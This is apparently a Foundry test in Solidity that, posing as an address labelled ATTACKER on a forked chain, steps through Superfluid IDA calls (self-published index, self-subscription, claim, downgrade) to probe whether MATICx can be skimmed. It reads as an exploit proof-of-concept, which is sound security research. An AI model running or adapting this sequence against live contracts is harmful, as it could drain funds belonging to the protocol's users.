// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ISuperfluid {
    function callAgreement(address agreementClass, bytes calldata callData, bytes calldata userData) external returns (bytes memory);
}

interface IIDA {
    function createIndex(address token, uint32 indexId, bytes calldata ctx) external returns (bytes memory);
    function updateSubscription(address token, uint32 indexId, address subscriber, uint128 units, bytes calldata ctx) external returns (bytes memory);
    function updateIndex(address token, uint32 indexId, uint128 indexValue, bytes calldata ctx) external returns (bytes memory);
    function claim(address token, address publisher, uint32 indexId, address subscriber, bytes calldata ctx) external returns (bytes memory);
    function getIndex(address token, address publisher, uint32 indexId) external view returns (bool, uint128, uint128, uint128);
    function getSubscription(address token, address publisher, uint32 indexId, address subscriber) external view returns (bool, bool, uint128, uint256);
}

interface IMATICx {
    function upgradeByETH() external payable;
    function downgradeToETH(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
    function realtimeBalanceOfNow(address) external view returns (int256, uint256, uint256);
}

contract SkimTest is Test {
    address constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICx = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_selfPublisherSubscriberSkim() public {
        vm.startPrank(ATTACKER);

        // Step 1: Upgrade 5 MATIC to MATICx
        IMATICx(MATICx).upgradeByETH{value: 5 ether}();
        console.log("After upgrade - MATICx balance:", IMATICx(MATICx).balanceOf(ATTACKER));
        console.log("After upgrade - native balance:", ATTACKER.balance);

        // Step 2: Create index (we are publisher)
        _hostCall(abi.encodeWithSelector(IIDA.createIndex.selector, MATICx, uint32(99), new bytes(0)));
        console.log("Index created");

        // Step 3: Add ourselves as subscriber with units
        _hostCall(abi.encodeWithSelector(IIDA.updateSubscription.selector, MATICx, uint32(99), ATTACKER, uint128(1000), new bytes(0)));
        console.log("Subscription added");

        // Step 4: Distribute by updating index value
        _hostCall(abi.encodeWithSelector(IIDA.updateIndex.selector, MATICx, uint32(99), uint128(1000000000000), new bytes(0)));
        console.log("Index updated (distributed)");

        // Check subscription state
        (bool exist, bool approved, uint128 units, uint256 pending) = IIDA(IDA).getSubscription(MATICx, ATTACKER, 99, ATTACKER);
        console.log("Subscription - exist:", exist, "approved:", approved);
        console.log("Subscription - units:", units, "pending:", pending);

        // Check all balances
        uint256 erc20bal = IMATICx(MATICx).balanceOf(ATTACKER);
        (int256 rtBal,,) = IMATICx(MATICx).realtimeBalanceOfNow(ATTACKER);
        console.log("ERC20 balance:", erc20bal);
        console.log("Realtime balance:", rtBal);
        console.log("Native before claim:", ATTACKER.balance);

        // Step 5: Claim (normal, no forgery first)
        _hostCall(abi.encodeWithSelector(IIDA.claim.selector, MATICx, ATTACKER, uint32(99), ATTACKER, new bytes(0)));
        console.log("=== After normal claim ===");

        erc20bal = IMATICx(MATICx).balanceOf(ATTACKER);
        (rtBal,,) = IMATICx(MATICx).realtimeBalanceOfNow(ATTACKER);
        console.log("ERC20 balance:", erc20bal);
        console.log("Realtime balance:", rtBal);

        // Step 6: Try to downgrade ALL
        console.log("Trying to downgrade full balanceOf...");
        try IMATICx(MATICx).downgradeToETH(erc20bal) {
            console.log("Downgrade succeeded! Native:", ATTACKER.balance);
        } catch {
            console.log("Downgrade failed");
            // Try downgrading the realtime balance
            if (rtBal > 0) {
                try IMATICx(MATICx).downgradeToETH(uint256(rtBal)) {
                    console.log("RT downgrade succeeded! Native:", ATTACKER.balance);
                } catch {
                    console.log("RT downgrade also failed");
                }
            }
        }

        vm.stopPrank();
    }

    function _hostCall(bytes memory data) internal {
        ISuperfluid(HOST).callAgreement(IDA, data, "");
    }
}
